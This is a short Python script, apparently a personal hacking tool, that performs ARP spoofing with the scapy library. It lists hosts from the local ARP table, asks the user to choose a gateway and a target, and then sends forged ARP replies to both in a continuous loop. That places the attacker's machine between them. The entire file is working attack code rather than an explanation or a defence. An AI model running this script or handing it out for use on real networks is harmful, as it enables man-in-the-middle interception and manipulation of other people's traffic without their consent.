#Author: Jack Orcherton
from scapy.all import send, ARP
from ARPresults import getTarget,fetchARPtable

def arpSpoof(gateway,target):
    """Given target & gateway IP & MAC initiates ARP spoof attack"""
    try:
        print("Attack Initiated :)")
        print("Press CTRL+C to stop at anytime")
        while(True):
            send(ARP(op=2, pdst=gateway[0], hwdst=gateway[1], psrc=target[0]), verbose=0)
            send(ARP(op=2, pdst=target[0], hwdst=target[1], psrc=gateway[0]), verbose=0)
    except KeyboardInterrupt:
        print("Stopping")
        return

def selectTarget():
    """Main function - allows user to set targets"""
    print("____________________________________________________\n\nARP Spoofing\n")
    if fetchARPtable(): #Ensures there are results in ARP table
        gateway=getTarget("Please type the ID of the gateway: ")
        target=getTarget("Please type ID of target: ")
        if gateway==None or target==False:  return
        arpSpoof(gateway,target)

if __name__ == '__main__':  selectTarget()#If the program isn't being imported - it will automatically run